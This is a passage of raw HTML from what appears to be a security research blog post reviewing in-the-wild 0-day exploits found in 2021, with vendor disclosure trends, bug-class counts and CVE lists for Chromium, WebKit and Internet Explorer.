src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRS0t_2Bwvc3U_EIr5h7NcWpQyjzHCPb4OMiDpzPxPs587otAEj8bzwch8UMFlgKchwdSq4L_PXRn1O6KGLHUl4X9voLBdZJNQsgQyJcMCVB4Y8-aRHaXRpOYZw7KVtyNYwdWpwX8ILUV1fyG2kDsXVWORsSPUBGVTON90gWf9POhhxA4edxNe1eoV/s1200/image2%285%29.png\" border=\"0\" alt=\"a line graph showing how many in-the-wild 0-days were found by their own vendor per year from 2015 to 2021. 2015: 0, 2016: 0, 2017: 2, 2018: 0, 2019: 4, 2020: 5, 2021: 17. Data comes from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" style=\"max-height: 750; max-width: 600px;\"title=\"a line graph showing how many in-the-wild 0-days were found by their own vendor per year from 2015 to 2021. 2015: 0, 2016: 0, 2017: 2, 2018: 0, 2019: 4, 2020: 5, 2021: 17. Data comes from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;We&amp;rsquo;ve also seen the number of vendors detecting in-the-wild 0-days in their own products increasing.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Whether or not these vendors were previously working on detection, vendors seem to have found ways to be more successful in 2021. Vendors likely have the most telemetry and overall knowledge and visibility into their products so it&amp;rsquo;s important that they are investing in (and hopefully having success in) detecting 0-days targeting their own products. As shown in the &lt;/span&gt;&lt;span&gt;chart above&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;, there was a significant increase in the number of in-the-wild 0-days discovered by vendors in their own products. Google discovered 7 of the in-the-wild 0-days in their own products and Microsoft discovered 10 in their products!&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.bkkzvkf2rtnk\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;More disclosure&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;The second reason why the number of detected in-the-wild 0-days has increased is due to more disclosure of these vulnerabilities. Apple and Google Android &lt;/span&gt;&lt;span&gt;(we &lt;/span&gt;&lt;span&gt;differentiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;ldquo;Google Android&amp;rdquo; rather than just &amp;ldquo;Google&amp;rdquo; because Google Chrome has been annotating their security bulletins for the last few years)&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;first began labeling vulnerabilities in their security advisories with the information about potential in-the-wild exploitation in November 2020 and January 2021 respectively. When vendors don&amp;rsquo;t annotate their release notes, the only way we know that a 0-day was exploited in-the-wild is if the researcher who discovered the exploitation comes forward. If Apple and Google Android had not begun annotating their release notes, the public would likely not know about at least 7 of the Apple in-the-wild 0-days and 5 of the Android in-the-wild 0-days. Why? Because these vulnerabilities were reported by &amp;ldquo;Anonymous&amp;rdquo; reporters. If the reporters didn&amp;rsquo;t want credit for the vulnerability, it&amp;rsquo;s unlikely that they would have gone public to say that there were indications of exploitation. That is 12 0-days that wouldn&amp;rsquo;t have been included in this year&amp;rsquo;s list if Apple and Google Android had not begun transparently annotating their security advisories. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;/p&gt;\n\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPe_J-0Wu9Ap-0n3Yj5BoXiWTnjViyyGasIChhb3juADZosK9nTbyiaWtzuRyjwG3frQNjLsvRMRoQHrFfo1iKa3GjmcuLHqat40GcoechQ16XbhpVGwF7m_TJ0Oucvy3wvm8x0aXbVnJfhkG2FNkxI4cJf5ONBqEYnPxQDUmZChvByLHE8OzSU20N/s1200/image3%287%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPe_J-0Wu9Ap-0n3Yj5BoXiWTnjViyyGasIChhb3juADZosK9nTbyiaWtzuRyjwG3frQNjLsvRMRoQHrFfo1iKa3GjmcuLHqat40GcoechQ16XbhpVGwF7m_TJ0Oucvy3wvm8x0aXbVnJfhkG2FNkxI4cJf5ONBqEYnPxQDUmZChvByLHE8OzSU20N/s1200/image3%287%29.png\" border=\"0\" alt=\"bar graph that shows the number of Android and Apple (WebKit + iOS + macOS) in-the-wild 0-days per year. The bar graph is split into two color: yellow for Anonymously reported 0-days and green for non-anonymous reported 0-days. 2021 is the only year with any anonymously reported 0-days. 2015: 0, 2016: 3, 2018: 2, 2019: 1, 2020: 3, 2021: Non-Anonymous: 8, Anonymous- 12. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" style=\"max-height: 750; max-width: 600px;\" title=\"bar graph that shows the number of Android and Apple (WebKit + iOS + macOS) in-the-wild 0-days per year. The bar graph is split into two color: yellow for Anonymously reported 0-days and green for non-anonymous reported 0-days. 2021 is the only year with any anonymously reported 0-days. 2015: 0, 2016: 3, 2018: 2, 2019: 1, 2020: 3, 2021: Non-Anonymous: 8, Anonymous- 12. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Kudos and thank you to Microsoft, Google Chrome, and Adobe who have been annotating their security bulletins for transparency for multiple years now! And thanks to Apache who also annotated their release notes for &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://httpd.apache.org/security/vulnerabilities_24.html\"&gt;CVE-2021-41773&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;this past year. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;In-the-wild 0-days in Qualcomm and ARM products were annotated as in-the-wild in Android security bulletins, but not in the vendor&amp;rsquo;s own security advisories.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;It&amp;#39;s highly likely that in 2021, there were other 0-days that were exploited in the wild and detected, but vendors did not mention this in their release notes. In 2022, we hope that more vendors start noting when they patch vulnerabilities that have been exploited in-the-wild. Until we&amp;rsquo;re confident that all vendors are transparently disclosing in-the-wild status, there&amp;rsquo;s a big question of how many in-the-wild 0-days are discovered, but not labeled publicly by vendors.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"HNYIspzEBn-c11\" id=\"h.s04j4o5mq8tl\"&gt;&lt;span&gt;New Year, Old Techniques&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;We had a record number of &amp;ldquo;data points&amp;rdquo; in 2021 to understand how attackers are actually using 0-day exploits. A bit surprising to us though, out of all those data points, there was nothing new amongst all this data. 0-day exploits are considered one of the most &lt;/span&gt;&lt;span&gt;advanced&lt;/span&gt;&lt;span&gt;&amp;nbsp;attack methods an actor can use, so it would be easy to conclude that attackers must be using special tricks and attack surfaces. But instead, the 0-days we saw in 2021 generally followed the same bug patterns, attack surfaces, and exploit &amp;ldquo;shapes&amp;rdquo; previously seen in public research. Once &amp;ldquo;0-day is hard&amp;rdquo;, we&amp;rsquo;d expect that to be successful, attackers would have to find new bug classes of vulnerabilities in new attack surfaces using never before seen exploitation methods. &lt;/span&gt;&lt;span&gt;In general, &lt;/span&gt;&lt;span&gt;that wasn&amp;#39;t what the&lt;/span&gt;&lt;span&gt;&amp;nbsp;data showed us this year. With two exceptions (described below in the iOS section) out of the 58, everything we saw was pretty &amp;ldquo;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://www.dictionary.com/browse/meh#:~:text=unimpressive%3B%20boring%3A\"&gt;meh&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;rdquo; or standard.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Out of the 58 in-the-wild 0-days for the year, 39, or 67% were memory corruption vulnerabilities. Memory corruption vulnerabilities have been the standard for attacking software for the last few decades and it&amp;rsquo;s still how attackers are having success. Out of these memory corruption vulnerabilities, the majority also stuck with very popular and well-known bug classes:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c6 lst-kix_bfmkl5o48mun-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;17 use-after-free&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;6 out-of-bounds read &amp;amp; write&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;4 buffer overflow&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;4 integer overflow&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;In the next sections we&amp;rsquo;ll dive into each major platform that we saw in-the-wild 0-days for this year. We&amp;rsquo;ll share the trends and explain why what we saw was pretty unexceptional.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.421487jv8qwq\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;Chromium (Chrome)&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Chromium had a record high number of 0-days detected and disclosed in 2021 with 14. Out of these 14, 10 were renderer remote code execution bugs, 2 were sandbox escapes, 1 was an infoleak, and 1 was used to open a webpage in Android apps other than Google Chrome.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;The 14 0-day vulnerabilities were in the following components:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c6 lst-kix_1mxsacho6zj1-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;6 JavaScript Engine - v8 (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://chromereleases.googleblog.com/2021/02/stable-channel-update-for-desktop_4.html\"&gt;CVE-2021-21148&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://chromereleases.googleblog.com/2021/02/stable-channel-update-for-desktop_4.html\"&gt;CVE-2021-30551&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://chromereleases.googleblog.com/2021/07/stable-channel-update-for-desktop.html\"&gt;CVE-2021-30563&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html\"&gt;CVE-2021-30632&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-37975.html\"&gt;CVE-2021-37975&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://chromereleases.googleblog.com/2021/10/stable-channel-update-for-desktop_28.html\"&gt;CVE-2021-38003&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;2 DOM Engine - Blink (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://chromereleases.googleblog.com/2021/03/stable-channel-update-for-desktop_12.html\"&gt;CVE-2021-21193&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;amp; &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop.html\"&gt;CVE-2021-21206&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 WebGL (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://chromereleases.googleblog.com/2021/06/stable-channel-update-for-desktop_17.html\"&gt;CVE-2021-30554&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 IndexedDB (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop.html\"&gt;CVE-2021-30633&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 webaudio (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-21166.html\"&gt;CVE-2021-21166&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 Portals (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop_24.html\"&gt;CVE-2021-37973&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 Android Intents (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-38000.html\"&gt;CVE-2021-38000&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 Core (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop_30.html\"&gt;CVE-2021-37976&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;When we look at the components targeted by these bugs, they&amp;rsquo;re all attack surfaces seen before in public security research and previous exploits. If anything, there are a few less DOM bugs and more targeting these other components of browsers like IndexedDB and WebGL than previously. 13 out of the 14 Chromium 0-days were memory corruption bugs. Similar to last year, most of those memory corruption bugs are use-after-free vulnerabilities.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;A couple of the Chromium bugs were even similar to previous in-the-wild 0-days. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-21166.html\"&gt;CVE-2021-21166&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an issue in &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c10\"&gt;ScriptProcessorNode::Process()&lt;/span&gt;&lt;span&gt;&amp;nbsp;in webaudio where there&amp;rsquo;s insufficient locks such that buffers are accessible in both the main thread and the audio rendering thread at the same time. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-13720.html\"&gt;CVE-2019-13720&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an in-the-wild 0-day from 2019. It was a vulnerability in &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c10\"&gt;ConvolverHandler::Process()&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;in webaudio where there were also insufficient locks such that a buffer was accessible in both the main thread and the audio rendering thread at the same time.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html\"&gt;CVE-2021-30632&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is another Chromium in-the-wild 0-day from 2021. It&amp;rsquo;s a type confusion in the &amp;nbsp;TurboFan JIT in Chromium&amp;rsquo;s JavaScript Engine, v8, where Turbofan fails to deoptimize code after a&lt;/span&gt;&lt;span&gt;&amp;nbsp;property map is changed&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html\"&gt;CVE-2021-30632&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in particular deals with code that stores global properties. &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-16009.html\"&gt;CVE-2020-16009&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;was also an in-the-wild 0-day that was due to Turbofan failing to deoptimize code after map deprecation.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.q5lkhzsdchwk\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;WebKit (Safari)&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Prior to 2021, Apple had only acknowledged &lt;/span&gt;&lt;span&gt;1 publicly known in-the-wild 0-day targeting WebKit/Safari, and that was due &lt;/span&gt;&lt;span&gt;the sharing by an external researcher. In 2021 there were 7. This makes it hard for us to assess trends or changes since we don&amp;rsquo;t have historical samples to go off of. Instead, we&amp;rsquo;ll look at 2021&amp;rsquo;s WebKit bugs in the context of other Safari bugs not known to be in-the-wild and other browser in-the-wild 0-days. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;The 7 in-the-wild 0-days targeted the following components:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c6 lst-kix_knibgsincpme-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;4 Javascript Engine - JavaScript Core (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212146\"&gt;CVE-2021-1870&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212146\"&gt;CVE-2021-1871&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212336\"&gt;CVE-2021-30663&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212336\"&gt;CVE-2021-30665&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=\"padding: 0;\" class=\"c6 lst-kix_grz5i5wr9ig-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 IndexedDB (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30858.html\"&gt;CVE-2021-30858&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 Storage (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212317\"&gt;CVE-2021-30661&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span&gt;1 Plugi&lt;/span&gt;&lt;span&gt;n&lt;/span&gt;&lt;span&gt;s (&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1879.html\"&gt;CVE-2021-1879&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;The one semi-surprise is that no DOM bugs were detected and disclosed. In previous years, vulnerabilities in the DOM engine have generally made up 15-20% of the in-the-wild browser 0-days, but none were detected and disclosed for WebKit in 2021. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;It would not be surprising if attackers are beginning to shift to other modules, like third party libraries or things like IndexedDB. The modules may be more promising to attackers going forward because there&amp;rsquo;s a better chance that the vulnerability may exist in multiple browsers or platforms&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;For example, the webaudio bug in Chromium, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-21166.html\"&gt;CVE-2021-21166&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, also existed in WebKit and was fixed as &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://support.apple.com/en-us/HT212223\"&gt;CVE-2021-1844&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, though there was no evidence it was exploited in-the-wild in WebKit. The IndexedDB in-the-wild 0-day that was used against Safari in 2021, &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30858.html\"&gt;CVE-2021-30858&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, was very, very similar to a &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=1032890\"&gt;bug fixed in Chromium in January 2020&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HNYIspzEBn-c7\" id=\"h.pypmw8ahj82o\"&gt;&lt;span class=\"HNYIspzEBn-c12\"&gt;Internet Explorer&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Since we began tracking in-the-wild 0-days, Internet Explorer has had a pretty consistent number of 0-days each year. 2021 actually tied 2016 for the most in-the-wild Internet Explorer 0-days we&amp;rsquo;ve ever tracked even though Internet Explorer&amp;rsquo;s market share of web browser users continues to decrease.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;/p&gt;\n\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbMTlnGhVLcVL8K20S3s6hSrpyB6kZAA9CWvWNpn1isbEbLFv0c2rs_dPvM0ALT45NtTvyhp8rGehGDRIAEJ6OZYSkk5mezOEoPJOquVXXyHeqrVOvRGEiQHv_J7Je8Itjc5qhwXMCR-E4y79abuxiddCYoeF2VrVakY-L1q82NeMEPjTA0fFC-t8h/s1200/image4%286%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img 